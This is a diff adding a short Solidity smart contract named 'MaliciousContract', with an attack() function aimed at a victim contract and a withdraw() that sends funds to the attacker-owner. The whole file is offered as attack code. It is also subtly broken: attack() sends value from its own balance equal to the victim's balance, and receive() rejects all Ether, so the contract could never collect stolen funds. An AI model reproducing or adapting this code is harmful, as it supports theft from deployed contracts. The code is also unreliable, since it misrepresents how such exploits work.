@@ -1,0 +1,26 @@
+
+pragma solidity ^0.8.0;
+
+contract MaliciousContract {
+    address payable public owner;
+
+    constructor() {
+        owner = payable(msg.sender);
+    }
+
+    receive() external payable {
+        // Revert all incoming Ether to prevent accidental deposits
+        revert();
+    }
+
+    function attack(address _victim) external {
+        // Call the vulnerable contract's fallback function
+        (bool success, ) = _victim.call{value: address(_victim).balance}("");
+        require(success);
+    }
+
+    function withdraw() public {
+        // Transfer all funds to the attacker's address
+        owner.transfer(address(this).balance);
+    }
+}
